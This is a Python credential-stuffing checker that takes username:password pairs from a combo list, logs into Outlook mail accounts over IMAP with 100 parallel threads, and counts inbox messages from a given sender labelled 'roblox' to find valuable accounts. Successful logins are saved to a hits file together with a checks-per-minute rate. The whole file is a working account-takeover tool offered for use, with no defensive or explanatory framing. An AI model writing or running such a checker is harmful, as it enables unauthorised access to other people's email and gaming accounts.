import imaplib, time, colorama, concurrent.futures
from colorama import Fore


def check_combo(combo):

    imap_address = "imap-mail.outlook.com"
    imap_port = 993

    combo = combo.strip()
    if ":" not in combo:
        print(Fore.RED + f"{combo} | invalid format" + Fore.RESET)
        return None
    username, password = combo.split(":", 1)
    try:
        imap_server= imaplib.IMAP4_SSL(imap_address, imap_port)
        result = imap_server.login(username, password)
        if result[0] == "OK":
            imap_server.select("inbox")
            status, messages = imap_server.search(None, "FROM", 
"no-reply@domain.com")
            message_count = len(messages[0].split())
            print(Fore.GREEN + f"[+] {combo}" + Fore.RESET)
            return f"{combo} | roblox: {message_count}"
        else:
            print(Fore.RED + f"[-] {combo} | invalid" + Fore.RESET)

    except imaplib.IMAP4.error as e:
        print(Fore.RED + f"{combo} | IMAP error: {e}" + Fore.RESET)

    except Exception as e:
      print(Fore.YELLOW + f"{combo} | {e}" + Fore.RESET)
    finally:
        try:
            imap_server.logout()
        except:
            pass

def checker():
    with open("combo.txt", "r") as f:
        combos = f.readlines()

    start_time = time.time()

    valid_combos = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(check_combo, combos))
        end_time = time.time()


    hits_count = 0
    with open("hits.txt", "w") as hits_file:
        for result in results:
            if result is not None:
                hits_file.write(result + "\n")
            hits_count += 1


    total_time = end_time - start_time
    total_checks = len(combos)
    cpm = (total_checks / total_time) * 60
    total_hits = hits_count
    print(Fore.BLUE + f"[+] Checked: {total_checks}" + Fore.RESET)
    print(Fore.BLUE + f"[+] Hits: {total_hits}" + Fore.RESET)
    print(Fore.BLUE + f"[+] Cpm: {cpm: .2f}" + Fore.RESET)    
    print(Fore.BLUE + f"[+] Time {total_time: .2f} seconds" + Fore.RESET)
checker()
